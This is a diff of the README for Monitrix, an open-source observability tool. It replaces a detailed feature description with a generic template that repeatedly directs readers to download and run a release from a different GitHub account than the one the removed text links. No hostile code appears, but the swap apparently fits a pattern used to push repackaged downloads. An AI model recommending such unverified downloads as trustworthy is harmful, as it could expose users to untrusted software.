@@ -1,122 +1,91 @@
-<h1 align="center" style="border-bottom: none">
-  
-     
-</h1>
+# Monitrix - Your Open-Source Observability Platform 🌐
 
-<p align="center">All your logs, metrics, and traces in one place. Monitor your application, spot issues before they occur and troubleshoot downtime quickly with rich context. Monitrix is a cost-effective open-source alternative to Datadog and New Relic.
+![Monitrix](https://img.shields.io/badge/Monitrix-Open%20Source-brightgreen)  
+[![Releases](https://img.shields.io/badge/Releases-Download%20Latest%20Version-blue)](https://github.com/DevHuann/monitrix/releases)
 
+Welcome to **Monitrix**, an open-source observability platform designed to provide a seamless experience in monitoring your applications. Built on OpenTelemetry, Monitrix integrates logs, traces, and metrics into a single application, offering a powerful alternative to popular tools like DataDog and NewRelic.
 
-  
-  
+## Table of Contents
 
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## Features
+## Features ✨
 
+- **Unified Observability**: Access logs, traces, and metrics all in one place.
+- **Open Source**: Fully open-source, allowing you to customize and extend as needed.
+- **Self-Hosting**: Run Monitrix on your own infrastructure.
+- **Multi-Language Support**: Compatible with various programming languages including Go, Python, Node.js, and more.
+- **Integration with Prometheus**: Leverage Prometheus for powerful metrics collection.
+- **User-Friendly Interface**: Built with React and SCSS for a modern and responsive design.
+- **Extensive Documentation**: Comprehensive guides and tutorials to help you get started quickly.
 
-### Application Performance Monitoring
+## Getting Started 🚀
 
-Use Monitrix APM to monitor your applications and services. It comes with out-of-box charts for key application metrics like p99 latency, error rate, Apdex and operations per second. You can also monitor the database and external calls made from your application. Read [more](https://Monitrix.io/application-performance-monitoring/).
+To get started with Monitrix, visit the [Releases](https://github.com/DevHuann/monitrix/releases) section to download the latest version. Follow the installation instructions below to set up your observability platform.
 
+## Installation 🛠️
 
+1. **Download the latest release** from the [Releases](https://github.com/DevHuann/monitrix/releases) section.
+2. **Extract the downloaded files** to your preferred directory.
+3. **Run the installation script**:
+   ```bash
+   ./install.sh
+   ```
+4. **Configure Monitrix** by editing the configuration file located in the `config` directory.
+5. **Start the application**:
+   ```bash
+   ./start.sh
+   ```
 
-![apm-cover](https://github.com/user-attachments/assets/fa5c0396-0854-4c8b-b972-9b62fd2a70d2)
+## Usage 📊
 
+Once installed, you can access Monitrix through your web browser. The default URL is `http://localhost:8080`. 
 
-### Logs Management
+### Key Features to Explore:
 
-Monitrix can be used as a centralized log management solution. We use ClickHouse (used by likes of Uber & Cloudflare) as a datastore, ⎯ an extremely fast and highly optimized storage for logs data. Instantly search through all your logs using quick filters and a powerful query builder.
+- **Dashboard**: View real-time metrics and logs.
+- **Trace Analysis**: Dive deep into your application's performance.
+- **Alerts**: Set up alerts based on specific metrics or thresholds.
+- **Integrations**: Connect with other tools and services for enhanced functionality.
 
-You can also create charts on your logs and monitor them with customized dashboards. 
+## Contributing 🤝
 
-![logs-management-cover](https://github.com/user-attachments/assets/343588ee-98fb-4310-b3d2-c5bacf9c7384)
+We welcome contributions to Monitrix! If you want to help, please follow these steps:
 
+1. **Fork the repository** on GitHub.
+2. **Create a new branch** for your feature or bug fix.
+   ```bash
+   git checkout -b feature/my-feature
+   ```
+3. **Make your changes** and commit them.
+   ```bash
+   git commit -m "Add my feature"
+   ```
+4. **Push your changes** to your forked repository.
+   ```bash
+   git push origin feature/my-feature
+   ```
+5. **Open a pull request** on the main repository.
 
-### Distributed Tracing
+### Code of Conduct
 
-Distributed Tracing is essential to troubleshoot issues in microservices applications. Powered by OpenTelemetry, distributed tracing in Monitrix can help you track user requests across services to help you identify performance bottlenecks. 
+We expect all contributors to adhere to our [Code of Conduct](CODE_OF_CONDUCT.md).
 
-See user requests in a detailed breakdown with the help of Flamegraphs and Gantt Charts. Click on any span to see the entire trace represented beautifully, which will help you make sense of where issues actually occurred in the flow of requests.
+## License 📜
 
+Monitrix is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
+## Contact 📬
 
-![distributed-tracing-cover](https://github.com/user-attachments/assets/9bfe060a-0c40-4922-9b55-8a97e1a4076c)
+For questions or feedback, please reach out to us through the following channels:
 
+- GitHub Issues: [Monitrix Issues](https://github.com/DevHuann/monitrix/issues)
+- Email: support@monitrix.com
 
-
-### Metrics and Dashboards
-
-Ingest metrics from your infrastructure or applications and create customized dashboards to monitor them. Create visualization that suits your needs with a variety of panel types like pie chart, time-series, bar chart, etc.
-
-Create queries on your metrics data quickly with an easy-to-use metrics query builder. Add multiple queries and combine those queries with formulae to create really complex queries quickly.
-
-
-
-![metrics-n-dashboards-cover](https://github.com/user-attachments/assets/a536fd71-1d2c-4681-aa7e-516d754c47a5)
-
-### Alerts
-
-Use alerts in Monitrix to get notified when anything unusual happens in your application. You can set alerts on any type of telemetry signal (logs, metrics, traces), create thresholds and set up a notification channel to get notified. Advanced features like alert history and anomaly detection can help you create smarter alerts.
-
-Alerts in Monitrix help you identify issues proactively so that you can address them before they reach your customers.
-
-
-
-![alerts-cover](https://github.com/user-attachments/assets/03873bb8-1b62-4adf-8f56-28bb7b1750ea)
-
-### Exceptions Monitoring
-
-Monitor exceptions automatically in Python, Java, Ruby, and Javascript. For other languages, just drop in a few lines of code and start monitoring exceptions.
-
-See the detailed stack trace for all exceptions caught in your application. You can also log in custom attributes to add more context to your exceptions. For example, you can add attributes to identify users for which exceptions occurred.
-
-
-
-
-![exceptions-cover](https://github.com/user-attachments/assets/4be37864-59f2-4e8a-8d6e-e29ad04298c5)
-
-
-<br /><br />
-
-## Why Monitrix?
-
-Monitrix is a single tool for all your monitoring and observability needs. Here are a few reasons why you should choose Monitrix:
-
-- Single tool for observability(logs, metrics, and traces)
-
-- Built on top of [OpenTelemetry](https://opentelemetry.io/), the open-source standard which frees you from any type of vendor lock-in
-
-- Correlated logs, metrics and traces for much richer context while debugging
-
-- Uses ClickHouse (used by likes of Uber & Cloudflare) as datastore - an extremely fast and highly optimized storage for observability data
-
-- DIY Query builder, PromQL, and ClickHouse queries to fulfill all your use-cases around querying observability data
-
-- Open-Source - you can use open-source or a mix of both based on your use case
-
-
-
-
-
-
-
-
-## Contributing
-
-We ❤️ contributions big or small. Please read [CONTRIBUTING.md](CONTRIBUTING.md) to get started with making contributions to Monitrix.
-
-
-
-
-
-
-## Documentation
-
-If you need any clarification or find something missing, feel free to raise a GitHub issue with the label `documentation` or reach out to us at the community slack channel.
-
-<br /><br />
-
-
-
-
-If you have any ideas, questions, or any feedback, please share on our [Github Discussions](https://github.com/ezeslucky/monitrix/discussions)
-
+Thank you for choosing Monitrix! We hope it helps you gain better insights into your applications. For more information, check the [Releases](https://github.com/DevHuann/monitrix/releases) section to stay updated on new features and improvements.
